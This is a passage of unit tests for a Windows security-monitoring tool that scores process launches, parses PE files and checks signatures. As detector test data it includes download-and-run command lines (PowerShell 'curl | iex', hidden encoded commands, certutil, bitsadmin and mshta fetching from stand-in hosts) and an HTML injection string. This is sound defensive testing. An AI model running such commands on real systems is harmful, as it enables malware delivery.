        self.assertEqual(blob.size, len("\\device\\a.exe") * 2 + 2)

    def make_event(self, filter_id=7, event_type=None, v6=False):
        import ctypes
        import ipaddress

        from guardian import wfp

        event = wfp.FWPM_NET_EVENT1()
        event.type = wfp.FWPM_NET_EVENT_TYPE_CLASSIFY_DROP if event_type is None else event_type
        drop = wfp.FWPM_NET_EVENT_CLASSIFY_DROP1(filterId=filter_id)
        event.classifyDrop = ctypes.pointer(drop)
        header = event.header
        header.flags = (
            wfp.FWPM_NET_EVENT_FLAG_REMOTE_ADDR_SET | wfp.FWPM_NET_EVENT_FLAG_REMOTE_PORT_SET
            | wfp.FWPM_NET_EVENT_FLAG_APP_ID_SET
        )
        if v6:
            header.ipVersion = wfp.FWP_IP_VERSION_V6
            header.remote.v6 = (ctypes.c_ubyte * 16)(*ipaddress.ip_address("2001:4860:4860::8888").packed)
        else:
            header.ipVersion = wfp.FWP_IP_VERSION_V4
            header.remote.v4 = int(ipaddress.ip_address("8.8.8.8"))
        header.remotePort = 443
        header.ipProtocol = 6
        text = ctypes.create_unicode_buffer("\\device\\a.exe")
        header.appId.size = ctypes.sizeof(text)
        header.appId.data = ctypes.addressof(text)
        event.keep = (drop, text)
        return event

    def test_parse_v4(self):
        from guardian import wfp

        self.assertEqual(
            wfp.parse_net_event(self.make_event(), {7}, 5.0),
            BlockedConnect("\\device\\a.exe", "8.8.8.8", 443, 6, 5.0),
        )

    def test_parse_v6(self):
        from guardian import wfp

        self.assertEqual(wfp.parse_net_event(self.make_event(v6=True), {7}, 5.0).remote_ip, "2001:4860:4860::8888")

    def test_parse_ignores_other_filters_and_event_types(self):
        from guardian import wfp

        self.assertIsNone(wfp.parse_net_event(self.make_event(filter_id=8), {7}, 5.0))
        self.assertIsNone(wfp.parse_net_event(self.make_event(event_type=6), {7}, 5.0))


class EventCollectionTests(unittest.TestCase):
    class Session:
        def __init__(self, current):
            self.current = current

        def collect_events(self):
            return self.current

        def set_collect_events(self, value):
            self.current = value

    def collection(self, settings):
        from guardian import wfp

        return wfp._EventCollection(settings, lambda: None)

    def test_turn_on_and_restore(self):
        settings = {}
        session = self.Session(0)
        collection = self.collection(settings)
        collection.turn_on(session)
        self.assertEqual((session.current, settings), (1, {"wfp_collect_original": 0}))
        collection.restore(session)
        self.assertEqual((session.current, settings), (0, {}))

    def test_already_on_is_left_alone(self):
        settings = {}
        session = self.Session(1)
        collection = self.collection(settings)
        collection.turn_on(session)
        collection.restore(session)
        self.assertEqual((session.current, settings), (1, {}))

    def test_crash_keeps_original_for_next_run(self):
        settings = {}
        self.collection(settings).turn_on(self.Session(0))
        session = self.Session(1)  # 異常終了後の次回起動
        collection = self.collection(settings)
        collection.turn_on(session)
        collection.restore(session)
        self.assertEqual((session.current, settings), (0, {}))


class SysmonFieldReportTests(unittest.TestCase):
    @staticmethod
    def xml(event_id, record, **data):
        fields = "".join(f"<Data Name='{key}'>{value}</Data>" for key, value in data.items())
        return (
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
            f"<EventID>{event_id}</EventID><EventRecordID>{record}</EventRecordID></System>"
            f"<EventData>{fields}</EventData></Event>"
        )

    def report(self, items, child_pid=7):
        from guardian.selfcheck import sysmon_field_report

        return sysmon_field_report(items, child_pid)

    def test_complete_events_pass(self):
        report = self.report([
            self.xml(1, 1, Image="c", CommandLine="c", ParentImage="p", ParentProcessId="1", ProcessId="7"),
            self.xml(22, 2, Image="c", QueryName="example.com", ProcessId="7"),
        ])
        self.assertTrue(report["events_parse"])
        self.assertTrue(report["event_1_fields_ok"] and report["event_22_fields_ok"] and report["own_child_found"])
        self.assertEqual(report["event_ids"], [1, 22])

    def test_missing_field_fails(self):
        report = self.report([self.xml(1, 1, Image="c", ProcessId="7")])
        self.assertFalse(report["event_1_fields_ok"])
        self.assertFalse(report["event_22_seen"])

    def test_no_events_fail(self):
        self.assertFalse(self.report([])["events_parse"])

    def test_report_holds_no_event_content(self):
        report = self.report([self.xml(1, 1, Image="secret.exe", CommandLine="secret", ParentImage="p", ProcessId="7")])
        self.assertNotIn("secret", str(report))


POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
ENCODED = POWERSHELL + " -NoProfile -EncodedCommand AAAA"


class DevToolShellTests(unittest.TestCase):
    def shell(self, **kw):
        return ProcFacts(100, 1, "powershell.exe", POWERSHELL, "cmd.exe", ENCODED, "valid", **kw)

    def test_encoded_shell_is_flagged_without_dev_tool(self):
        from guardian.launchwatch import assess_launch

        self.assertIn("shell_download", [r.code for r in assess_launch(self.shell(), system_root=ROOT).reasons])

    def test_encoded_shell_from_dev_tool_is_not_flagged(self):
        from guardian.launchwatch import assess_launch

        self.assertEqual(assess_launch(self.shell(dev_tool="claude.exe"), system_root=ROOT).level, LOW)

    def test_clickfix_and_document_child_still_flagged(self):
        from guardian.launchwatch import assess_launch

        facts = ProcFacts(100, 1, "powershell.exe", POWERSHELL, "winword.exe", "x", "valid", dev_tool="claude.exe")
        self.assertIn("document_child", [r.code for r in assess_launch(facts, system_root=ROOT).reasons])

    def test_network_check_keeps_shell_rule_but_drops_encoded(self):
        codes = [r.code for r in assess(self.shell(dev_tool="claude.exe"), OUT(), ROOT).reasons]
        self.assertIn("shell_net", codes)
        self.assertNotIn("encoded_cmd", codes)
        self.assertIn("encoded_cmd", [r.code for r in assess(self.shell(), OUT(), ROOT).reasons])


class DevToolSignatureTests(unittest.TestCase):
    def setUp(self):
        from guardian.winapi import WinInspector

        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.path = str(Path(temp.name) / "claude.exe")
        Path(self.path).write_bytes(b"x")
        self.inspector = WinInspector()

    def signature(self, status, organization):
        from guardian.signinfo import CertInfo, SignatureInfo

        return mock.patch(
            "guardian.signinfo.read_signature",
            return_value=SignatureInfo(status=status, chain=[CertInfo(organization=organization)]),
        )

    def test_real_signer_is_accepted(self):
        with self.signature("valid", "Anthropic, PBC"):
            self.assertEqual(self.inspector.dev_tool_of_image(self.path), "claude.exe")

    def test_same_name_with_another_signer_is_rejected(self):
        with self.signature("valid", "Someone Else LLC"):
            self.assertIsNone(self.inspector.dev_tool_of_image(self.path))

    def test_invalid_signature_is_rejected(self):
        with self.signature("invalid", "Anthropic, PBC"):
            self.assertIsNone(self.inspector.dev_tool_of_image(self.path))

    def test_other_program_is_never_a_dev_tool(self):
        other = str(Path(self.path).with_name("game.exe"))
        Path(other).write_bytes(b"x")
        with self.signature("valid", "Anthropic, PBC"):
            self.assertIsNone(self.inspector.dev_tool_of_image(other))

    def ancestor(self, table, created=None):
        created = created or {pid: pid for pid in table}
        with mock.patch("guardian.winapi.process_created", side_effect=lambda pid: created.get(pid)), \
                mock.patch("guardian.winapi.process_path", return_value=self.path), \
                self.signature("valid", "Anthropic, PBC"):
            return self.inspector._dev_tool_ancestor("powershell.exe", 20, 30, table)

    def test_walks_through_cmd_to_the_tool(self):
        table = {30: ("powershell.exe", 20), 20: ("cmd.exe", 10), 10: ("claude.exe", 1)}
        self.assertEqual(self.ancestor(table), "claude.exe")

    def test_other_parent_stops_the_walk(self):
        table = {30: ("powershell.exe", 20), 20: ("evil.exe", 10), 10: ("claude.exe", 1)}
        self.assertIsNone(self.ancestor(table))

    def test_reused_parent_pid_is_rejected(self):
        table = {30: ("powershell.exe", 20), 20: ("claude.exe", 1)}
        self.assertIsNone(self.ancestor(table, {20: 99}))

    def test_non_shell_is_not_checked(self):
        self.assertIsNone(self.inspector._dev_tool_ancestor("game.exe", 20, 30, {20: ("claude.exe", 1)}))


class UntrustableTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.store = Store(temp.name)
        self.engine = Engine(FakeSource(), FakeInspector(), FakeActions(), self.store, clock=lambda: 1000.0, self_pids={99})

    def test_existing_shell_trust_is_ignored_and_removed(self):
        self.store.add_trust(POWERSHELL, "hash")
        self.assertFalse(self.engine._is_trusted_path(POWERSHELL))
        self.store.add_trust(r"C:\apps\tool.exe", "hash2")
        self.engine._remove_untrustable()
        self.assertEqual([e["path"] for e in self.store.trust_entries()], [r"C:\apps\tool.exe"])
        self.assertTrue(any(e["event"] == "trust_removed" for e in self.store.recent_events()))

    def test_is_untrustable(self):
        from guardian.engine import is_untrustable

        for path in (POWERSHELL, r"C:\Windows\System32\cmd.exe", r"C:\Windows\System32\RUNDLL32.EXE"):
            self.assertTrue(is_untrustable(path), path)
        for path in (r"C:\apps\tool.exe", None, ""):
            self.assertFalse(is_untrustable(path), path)


class SysmonWatchTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.store = Store(temp.name)
        self.states = {"Sysmon": "running", "SysmonDrv": "running"}

    def watch(self):
        from guardian.servicewatch import SysmonWatch

        return SysmonWatch(self.store, lambda name: self.states.get(name, "missing"))

    def test_never_installed_says_nothing(self):
        self.states = {}
        self.assertIsNone(self.watch().check())

    def test_stop_is_reported_once_and_recovery_after(self):
        watch = self.watch()
        self.assertIsNone(watch.check())
        self.states["Sysmon"] = "stopped"
        self.assertEqual(watch.check(), "stopped")
        self.assertTrue(watch.down)
        self.assertIsNone(watch.check())
        self.states["Sysmon"] = "running"
        self.assertEqual(watch.check(), "recovered")
        self.assertFalse(watch.down)

    def test_driver_unloaded_counts_as_stopped(self):
        watch = self.watch()
        watch.check()
        self.states["SysmonDrv"] = "stopped"
        self.assertEqual(watch.check(), "stopped")

    def test_removal_while_not_running_is_found_at_next_start(self):
        self.watch().check()
        self.states = {}
        self.assertEqual(self.watch().check(), "stopped")
        self.assertIsNone(self.watch().check())

    def test_unknown_state_is_not_an_alarm(self):
        watch = self.watch()
        watch.check()
        watch.query = lambda _name: "unknown"
        self.assertIsNone(watch.check())


class WatchdogLogicTests(unittest.TestCase):
    def test_decide(self):
        from guardian.watchdog import GIVE_UP, NOTHING, RESTART, decide

        self.assertEqual(decide(True, False, True), NOTHING)
        self.assertEqual(decide(False, True, True), NOTHING)
        self.assertEqual(decide(False, False, True), RESTART)
        self.assertEqual(decide(False, False, False), GIVE_UP)

    def test_restart_limit_and_window(self):
        from guardian.watchdog import RESTART_LIMIT, RESTART_WINDOW, allow_restart

        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "restarts.json"
            for i in range(RESTART_LIMIT):
                self.assertTrue(allow_restart(path, 1000.0 + i))
            self.assertFalse(allow_restart(path, 1010.0))
            self.assertTrue(allow_restart(path, 1010.0 + RESTART_WINDOW))

    def test_broken_restart_log_is_ignored(self):
        from guardian.watchdog import allow_restart

        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "restarts.json"
            path.write_text("not json", encoding="ascii")
            self.assertTrue(allow_restart(path, 1.0))

    def test_restart_arguments_never_ask_for_elevation(self):
        from guardian.watchdog import restart_arguments

        self.assertEqual(restart_arguments(["--observe"]), ["--observe", "--no-elevate", "--restarted"])
        self.assertEqual(restart_arguments(["--restarted", "--no-elevate"]), ["--no-elevate", "--restarted"])


class PlainLinesTests(unittest.TestCase):
    def test_plain_has_every_line(self):
        from guardian.characters import PLAIN

        self.assertEqual(set(PLAIN.lines), set(CHARACTERS[DEFAULT_CHARACTER].lines))
        for key in PLAIN.lines:
            self.assertNotIn("{", PLAIN.line(key, name="a", state="b", count=1, minutes=1, folder="f"), key)

    def test_plain_is_not_selectable(self):
        self.assertNotIn("plain", CHARACTERS)


class StartupTaskTests(unittest.TestCase):
    def test_xml_is_valid_and_keeps_running(self):
        import xml.etree.ElementTree as ET

        from guardian.startup import task_xml

        text = task_xml(r"C:\a&b\GuardianMascot.exe", "", r"PC\user")
        root = ET.fromstring(text.split("\n", 1)[1])
        ns = "{http://schemas.microsoft.com/windows/2004/02/mit/task}"
        self.assertEqual(root.find(f"{ns}Actions/{ns}Exec/{ns}Command").text, r"C:\a&b\GuardianMascot.exe")
        self.assertIsNone(root.find(f"{ns}Actions/{ns}Exec/{ns}Arguments"))
        self.assertEqual(root.find(f"{ns}Principals/{ns}Principal/{ns}RunLevel").text, "HighestAvailable")
        self.assertEqual(root.find(f"{ns}Settings/{ns}ExecutionTimeLimit").text, "PT0S")
        self.assertEqual(root.find(f"{ns}Settings/{ns}DisallowStartIfOnBatteries").text, "false")

    def test_enable_writes_utf16_and_cleans_up(self):
        from guardian.startup import StartupTask

        seen = {}

        def run(arguments):
            seen["arguments"] = arguments
            path = arguments[arguments.index("/xml") + 1]
            seen["path"] = path
            seen["text"] = Path(path).read_text(encoding="utf-16")
            return True

        self.assertTrue(StartupTask("t", run).enable(r"C:\a.exe", "", "PC\\u"))
        self.assertEqual(seen["arguments"][:3], ["/create", "/tn", "t"])
        self.assertIn(r"C:\a.exe", seen["text"])
        self.assertFalse(Path(seen["path"]).exists())

    def test_disable_and_query_use_the_task_name(self):
        from guardian.startup import StartupTask

        calls = []

        def run(arguments):
            calls.append(arguments)
            return True

        task = StartupTask("t", run)
        self.assertTrue(task.is_enabled())
        self.assertTrue(task.disable())
        self.assertEqual(calls, [["/query", "/tn", "t"], ["/delete", "/tn", "t", "/f"]])


class AuditPolicyWriteTests(unittest.TestCase):
    def make_backend(self, privilege_ok):
        from guardian.traps import WinAuditBackend

        backend = WinAuditBackend()
        backend._enable_privilege = mock.Mock(return_value=privilege_ok)
        backend.advapi32 = mock.Mock()
        backend.advapi32.AuditSetSystemPolicy.return_value = 1
        return backend

    def test_write_enables_privilege_first(self):
        backend = self.make_backend(True)
        self.assertTrue(backend.write_policy(1))
        backend._enable_privilege.assert_called_once_with("SeSecurityPrivilege")
        backend.advapi32.AuditSetSystemPolicy.assert_called_once()

    @staticmethod
    def written(backend):
        return [
            int.from_bytes(call.args[0].raw[16:20], "little")
            for call in backend.advapi32.AuditSetSystemPolicy.call_args_list
        ]

    def test_restoring_zero_writes_none(self):
        backend = self.make_backend(True)
        self.assertTrue(backend.write_policy(0))
        self.assertEqual(self.written(backend), [backend.POLICY_NONE])

    def test_restoring_failure_only_clears_success_first(self):
        backend = self.make_backend(True)
        self.assertTrue(backend.write_policy(2))
        self.assertEqual(self.written(backend), [backend.POLICY_NONE, 2])

    def test_turning_on_keeps_other_bits(self):
        backend = self.make_backend(True)
        self.assertTrue(backend.write_policy(3))
        self.assertEqual(self.written(backend), [3])

    def test_write_stops_without_privilege(self):
        backend = self.make_backend(False)
        self.assertFalse(backend.write_policy(1))
        backend.advapi32.AuditSetSystemPolicy.assert_not_called()


class RevokeCheckTests(unittest.TestCase):
    def test_test_host_is_outside_local_permits(self):
        import ipaddress

        from guardian.selfcheck import REVOKE_TEST_HOST
        from guardian.wfp import LOCAL_NETWORKS_V4

        address = ipaddress.ip_address(REVOKE_TEST_HOST)
        self.assertFalse(any(address in network for network in LOCAL_NETWORKS_V4))


class StoreSaveTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.store = Store(temp.name)
        self.dir = temp.name
        patcher = mock.patch("guardian.store.SAVE_RETRY_SECONDS", 0)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_retries_when_file_is_briefly_locked(self):
        real = os.replace
        calls = []

        def flaky(src, dst):
            calls.append(src)
            if len(calls) < 3:
                raise PermissionError(13, "locked")
            real(src, dst)

        self.store.settings["x"] = 5
        with mock.patch("guardian.store.os.replace", flaky):
            self.store.save_settings()
        self.assertEqual(len(calls), 3)
        self.assertEqual(Store(self.dir).settings["x"], 5)

    def test_failure_is_recorded_and_does_not_raise(self):
        with mock.patch("guardian.store.os.replace", side_effect=PermissionError(13, "locked")):
            self.store.settings["x"] = 5
            self.store.save_settings()
        self.assertEqual(self.store.recent_events()[0]["event"], "save_failed")
        self.assertEqual(self.store.settings["x"], 5)


class CharacterTests(unittest.TestCase):
    VALUES = dict(name="a.exe", state="見守り中", count=1, minutes=15, folder="f")

    def test_all_characters_have_same_lines(self):
        expected = set(CHARACTERS[DEFAULT_CHARACTER].lines)
        for character in CHARACTERS.values():
            self.assertEqual(set(character.lines), expected, character.id)
            self.assertTrue(character.idle_lines)

    def test_every_line_formats_without_leftovers(self):
        for character in CHARACTERS.values():
            for key in character.lines:
                text = character.line(key, **self.VALUES)
                self.assertNotIn("{", text, f"{character.id}.{key}")

    def test_lines_differ_between_characters(self):
        luce, ansel = CHARACTERS["luce"], CHARACTERS["ansel"]
        for key in luce.lines:
            self.assertNotEqual(luce.lines[key], ansel.lines[key], key)

    def test_unknown_character_falls_back(self):
        for value in (None, "", "nobody", 3, ["luce"]):
            self.assertEqual(get_character(value).id, DEFAULT_CHARACTER)
        self.assertEqual(get_character("ansel").id, "ansel")

    def test_every_character_has_all_state_images(self):
        root = Path(__file__).resolve().parent / "assets" / "mascot"
        for character in CHARACTERS:
            for state in ("idle", "watch", "alert", "sleep", "observe", "down"):
                self.assertTrue((root / character / f"{state}.png").is_file(), f"{character}/{state}")


def build_pe(
    sections=((b".text", 0x60000020, b"\x90" * 512), (b".data", 0xC0000040, b"\0" * 512)),
    imports=(("kernel32.dll", ("ExitProcess", "WriteProcessMemory", "CreateRemoteThread")),),
    overlay=b"", cert=b"", dotnet=False, is_64=True,
):
    """テスト用の最小のPEを組み立てる。実行はしない。"""
    optional_size = 240 if is_64 else 224
    header_end = 0x80 + 24 + optional_size + 40 * (len(sections) + 1)
    first_raw = (header_end + 0x1FF) & ~0x1FF
    # 最後のセクションとしてインポート表を置く
    import_va = 0x1000 * (len(sections) + 1)
    table = bytearray()
    descriptors = 20 * (len(imports) + 1)
    names = bytearray()
    thunks = bytearray()
    entries = []
    thunk_size = 8 if is_64 else 4
    thunk_base = descriptors
    thunk_total = sum((len(funcs) + 1) * thunk_size for _, funcs in imports)
    name_base = thunk_base + thunk_total
    for dll, funcs in imports:
        thunk_rva = import_va + thunk_base + len(thunks)
        dll_rva = import_va + name_base + len(names)
        names += dll.encode() + b"\0"
        for func in funcs:
            hint_rva = import_va + name_base + len(names)
            names += b"\0\0" + func.encode() + b"\0"
            thunks += struct.pack("<Q" if is_64 else "<I", hint_rva)
        thunks += b"\0" * thunk_size
        entries.append(struct.pack("<IIIII", thunk_rva, 0, 0, dll_rva, thunk_rva))
    table += b"".join(entries) + b"\0" * 20 + thunks + names
    all_sections = list(sections) + [(b".idata", 0x40000040, bytes(table))]

    raw = first_raw
    section_table = bytearray()
    bodies = bytearray()
    for index, (name, flags, body) in enumerate(all_sections):
        size = (len(body) + 0x1FF) & ~0x1FF
        section_table += struct.pack("<8sIIIIIIHHI", name, len(body), 0x1000 * (index + 1), size, raw, 0, 0, 0, 0, flags)
        bodies += body.ljust(size, b"\0")
        raw += size
    cert_offset = raw + len(overlay) if cert else 0

    optional = bytearray(optional_size)
    struct.pack_into("<H", optional, 0, 0x20B if is_64 else 0x10B)
    struct.pack_into("<I", optional, 16, 0x1000)
    struct.pack_into("<H", optional, 68, 3)
    struct.pack_into("<H", optional, 70, 0x0140)
    directories = 112 if is_64 else 96
    struct.pack_into("<I", optional, directories - 4, 16)
    struct.pack_into("<II", optional, directories + 8, import_va, len(table))
    if cert:
        struct.pack_into("<II", optional, directories + 32, cert_offset, len(cert))
    if dotnet:
        struct.pack_into("<II", optional, directories + 112, 0x1000, 72)
    coff = struct.pack("<HHIIIHH", 0x8664 if is_64 else 0x14C, len(all_sections), 1700000000, 0, 0, optional_size, 0x22)
    header = bytearray(b"MZ".ljust(0x3C, b"\0") + struct.pack("<I", 0x80)).ljust(0x80, b"\0")
    header += b"PE\0\0" + coff + optional + section_table
    return bytes(header.ljust(first_raw, b"\0") + bodies + overlay + cert)


def win_cert(payload_len=32):
    return struct.pack("<IHH", 8 + payload_len, 0x200, 2) + b"\x30" * payload_len


class PeTests(unittest.TestCase):
    def test_basic_fields(self):
        pe = parse_pe(build_pe())
        self.assertEqual(pe.machine, "x64")
        self.assertTrue(pe.is_64bit and pe.aslr and pe.dep)
        self.assertEqual(pe.subsystem, "コンソール")
        self.assertEqual([s.name for s in pe.sections], [".text", ".data", ".idata"])
        self.assertEqual(pe.entry_section, ".text")
        self.assertEqual(pe.imports["kernel32.dll"], ["ExitProcess", "WriteProcessMemory", "CreateRemoteThread"])
        self.assertEqual(pe.errors, [])

    def test_32bit(self):
        pe = parse_pe(build_pe(is_64=False))
        self.assertFalse(pe.is_64bit)
        self.assertEqual(pe.import_count, 3)

    def test_rwx_and_packer_and_entropy(self):
        random_body = random.Random(1).randbytes(4096)
        pe = parse_pe(build_pe(sections=((b"UPX0", 0xE0000020, random_body),)))
        self.assertEqual(pe.packers, ["UPX"])
        self.assertTrue(pe.sections[0].executable and pe.sections[0].writable)
        self.assertGreater(pe.sections[0].entropy, 7.5)

    def test_overlay_and_cert(self):
        pe = parse_pe(build_pe(overlay=b"X" * 1000, cert=win_cert()))
        self.assertEqual(pe.overlay_size, 1000)
        self.assertEqual(pe.cert_size, 40)
        self.assertEqual(pe.cert_slack, 0)

    def test_cert_padding_is_found(self):
        pe = parse_pe(build_pe(cert=win_cert() + b"hidden-payload!!" * 4))
        self.assertGreater(pe.cert_slack, 0)

    def test_dotnet(self):
        self.assertTrue(parse_pe(build_pe(dotnet=True)).is_dotnet)

    def test_not_pe(self):
        for data in (b"", b"hello", b"MZ", b"MZ" + b"\0" * 100, b"\0" * 4096):
            self.assertIsNone(parse_pe(data))

    def test_corrupt_never_raises(self):
        base = build_pe(overlay=b"X" * 64, cert=win_cert())
        rng = random.Random(7)
        for _ in range(800):
            data = bytearray(base)
            for _ in range(rng.randrange(1, 12)):
                data[rng.randrange(0x3C, min(len(data), 0x400))] = rng.randrange(256)
            parse_pe(bytes(data))
            parse_pe(bytes(data[:rng.randrange(len(data))]))

    def test_huge_counts_are_limited(self):
        data = bytearray(build_pe())
        struct.pack_into("<H", data, 0x80 + 6, 0xFFFF)
        started = time.perf_counter()
        pe = parse_pe(bytes(data))
        self.assertLess(time.perf_counter() - started, 1)
        self.assertTrue(pe.errors)


def signature(status=VALID, subject="Example Corp", kind="埋め込み", signed_at=None, digest="SHA-256", not_before=None, not_after=None):
    chain = [CertInfo(subject=subject, organization=subject, issuer="Example CA", not_before=not_before, not_after=not_after)] if status != UNSIGNED else []
    return SignatureInfo(status=status, kind=kind, signed_at=signed_at, digest=digest, chain=chain)


NOW = datetime(2026, 11, 6, tzinfo=timezone.utc)


class NoteTests(unittest.TestCase):
    def notes(self, path=r"C:\Program Files\App\app.exe", name="app.exe", **fields):
        report = ProgramReport(path=path, name=name, exists=True, **fields)
        return build_notes(report, NOW, ROOT)

    def severity(self, notes, text):
        return next((n.severity for n in notes if text in n.text), None)

    def test_valid_signature_is_good_but_not_absolute(self):
        notes = self.notes(signature=signature())
        self.assertEqual(self.severity(notes, "署名は有効"), GOOD)
        self.assertEqual(self.severity(notes, "盗まれた"), GOOD)
        self.assertEqual(self.severity(notes, "失効の確認はしていません"), INFO)

    def test_bad_signature_states(self):
        self.assertEqual(self.severity(self.notes(signature=signature(TAMPERED)), "書き換え"), NOTE_BAD)
        self.assertEqual(self.severity(self.notes(signature=signature(REVOKED)), "失効しています"), NOTE_BAD)
        self.assertEqual(self.severity(self.notes(signature=signature(UNTRUSTED)), "信頼されていない"), WARN)

    def test_unsigned_depends_on_location(self):
        unsigned = signature(UNSIGNED)
        self.assertEqual(self.severity(self.notes(signature=unsigned), "署名がありません"), INFO)
        notes = self.notes(path=r"C:\Users\u\Downloads\a.exe", signature=unsigned)
        self.assertEqual(self.severity(notes, "署名がありません"), WARN)
        self.assertEqual(self.severity(notes, "不審な場所"), WARN)

    def test_impersonation(self):
        notes = self.notes(signature=signature(subject="Evil LLC"), version={"CompanyName": "Microsoft Corporation"})
        self.assertEqual(self.severity(notes, "なりすまし"), NOTE_BAD)
        notes = self.notes(signature=signature(UNSIGNED), version={"CompanyName": "Google LLC"})
        self.assertEqual(self.severity(notes, "なりすまし"), NOTE_BAD)
        notes = self.notes(signature=signature(subject="Microsoft Windows"), version={"CompanyName": "Microsoft Corporation"})
        self.assertIsNone(self.severity(notes, "なりすまし"))
        notes = self.notes(signature=signature(subject="Small Co"), version={"CompanyName": "Small Co"})
        self.assertIsNone(self.severity(notes, "なりすまし"))

    def test_renamed(self):
        self.assertEqual(self.severity(self.notes(name="invoice.exe", version={"OriginalFilename": "psexec.exe"}), "改名"), WARN)
        self.assertIsNone(self.severity(self.notes(name="explorer.exe", version={"OriginalFilename": "EXPLORER.EXE.MUI"}), "改名"))

    def test_short_lived_and_new_cert(self):
        start = NOW - timedelta(days=1)
        notes = self.notes(signature=signature(not_before=start, not_after=start + timedelta(days=3), signed_at=NOW))
        self.assertEqual(self.severity(notes, "短命"), INFO)
        notes = self.notes(signature=signature(not_before=start, not_after=start + timedelta(days=365), signed_at=NOW))
        self.assertEqual(self.severity(notes, "発行から"), INFO)

    def test_old_digest(self):
        self.assertEqual(self.severity(self.notes(signature=signature(digest="SHA-1")), "古いハッシュ"), WARN)

    def test_motw(self):
        notes = self.notes(motw={"ZoneId": "3", "HostUrl": "https://example.test/a.exe"})
        self.assertEqual(self.severity(notes, "example.test"), WARN)
        self.assertEqual(self.severity(self.notes(motw={"ZoneId": "1"}), "入手元"), INFO)

    def test_sideloading_is_bad_for_signed_loader(self):
        process = ProcessInfo(1, modules_outside=[ModuleInfo(r"C:\Users\u\Downloads\libcares-2.dll", UNSIGNED)])
        notes = self.notes(signature=signature(), process=process)
        self.assertEqual(self.severity(notes, "署名のないDLL"), NOTE_BAD)
        process = ProcessInfo(1, modules_outside=[ModuleInfo(r"C:\Program Files\App\plugin.dll", UNSIGNED)])
        self.assertIsNone(self.severity(self.notes(signature=signature(), process=process), "署名のないDLL"))

    def test_process_clues(self):
        process = ProcessInfo(1, parents=["WINWORD.EXE", "explorer.exe"])
        self.assertEqual(self.severity(self.notes(process=process), "文書アプリ"), NOTE_BAD)
        process = ProcessInfo(1, cmdline="chrome.exe --remote-debugging-port=9222")
        self.assertEqual(self.severity(self.notes(name="chrome.exe", process=process), "リモートデバッグ"), WARN)

    def test_pe_clues(self):
        pe = parse_pe(build_pe(sections=((b"UPX0", 0xE0000020, bytes(range(256)) * 16),)))
        notes = self.notes(pe=pe)
        self.assertEqual(self.severity(notes, "圧縮・難読化"), WARN)
        self.assertEqual(self.severity(notes, "書き込みと実行"), WARN)
        self.assertEqual(self.severity(notes, "他のプロセスへの注入"), INFO)
        self.assertEqual(self.severity(self.notes(pe=parse_pe(build_pe(cert=win_cert() + b"x" * 64))), "検証対象外"), WARN)

    def test_future_build_date_only_without_valid_signature(self):
        pe = parse_pe(build_pe())
        pe.timestamp = int((NOW + timedelta(days=500)).timestamp())
        self.assertEqual(self.severity(self.notes(pe=pe), "ビルド日時"), INFO)
        self.assertIsNone(self.severity(self.notes(pe=pe, signature=signature()), "ビルド日時"))

    def test_most_serious_first(self):
        notes = self.notes(signature=signature(TAMPERED), motw={"ZoneId": "1"})
        self.assertEqual(notes[0].severity, NOTE_BAD)


class ReportViewTests(unittest.TestCase):
    def test_html_escapes_untrusted_text(self):
        evil = '<img src="http://evil.test/x"><a href="http://evil.test">x</a>'
        report = ProgramReport(
            path="C:\\" + evil, name=evil, exists=True, version={"CompanyName": evil},
            motw={"ZoneId": "3", "HostUrl": evil}, signature=signature(subject=evil),
            process=ProcessInfo(1, cmdline=evil, parents=[evil]),
        )
        report.notes = build_notes(report, NOW, ROOT)
        html = report_html(report)
        self.assertNotIn("<img", html)
        self.assertNotIn("<a ", html)
        self.assertIn("&lt;img", html)

    def test_text_has_the_key_facts(self):
        report = ProgramReport(path=r"C:\a.exe", name="a.exe", exists=True, sha256="abc123", signature=signature(subject="Example Corp"))
        report.notes = build_notes(report, NOW, ROOT)
        text = report_text(report)
        for expected in ("a.exe", "abc123", "Example Corp", "判断材料"):
            self.assertIn(expected, text)

    def test_missing_file_renders(self):
        report = ProgramReport(path=None, name="PID 5")
        report.notes = build_notes(report, NOW, ROOT)
        self.assertIn("PID 5", report_html(report))


PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


class LaunchTests(unittest.TestCase):
    def level(self, path, cmd="", parent=None, signature_state="valid", zone=None):
        facts = ProcFacts(1, 1, path.rsplit("\\", 1)[-1], path, parent, cmd, signature_state)
        return assess_launch(facts, zone, ROOT)

    def test_ordinary_launches_are_low(self):
        for args in (
            (r"C:\Windows\System32\notepad.exe", "notepad", "explorer.exe"),
            (PS, "powershell", "explorer.exe"),
            (PS, 'powershell -c "curl https://example.test"', "Code.exe"),
            (r"C:\Windows\System32\cmd.exe", "cmd /c dir", "explorer.exe"),
            (r"C:\Program Files\App\app.exe", "app", "explorer.exe", "unsigned"),
            (r"C:\Users\u\Downloads\setup.exe", "setup", "explorer.exe", "valid", 3),
            (r"C:\Users\u\AppData\Local\App\app.exe", "app", "explorer.exe", "unsigned"),
        ):
            self.assertEqual(self.level(*args).level, LOW, args)

    def test_clickfix_is_high(self):
        self.assertEqual(self.level(PS, "powershell -w hidden -enc AAAA", "explorer.exe").level, HIGH)
        self.assertEqual(self.level(PS, 'powershell -c "curl https://x.test | iex "', "explorer.exe").level, HIGH)
        self.assertEqual(self.level(PS, "powershell curl.exe https://x.test/a", "chrome.exe").level, HIGH)

    def test_encoded_without_interactive_parent_is_medium(self):
        self.assertEqual(self.level(PS, "powershell -enc AAAA", "Code.exe").level, MEDIUM)

    def test_download_tools_are_high(self):
        system = r"C:\Windows\System32"
        self.assertEqual(self.level(system + r"\mshta.exe", "mshta https://x.test/a.hta").level, HIGH)
        self.assertEqual(self.level(system + r"\certutil.exe", "certutil -urlcache -f http://x.test a").level, HIGH)
        self.assertEqual(self.level(system + r"\bitsadmin.exe", "bitsadmin /transfer j http://x.test a").level, HIGH)
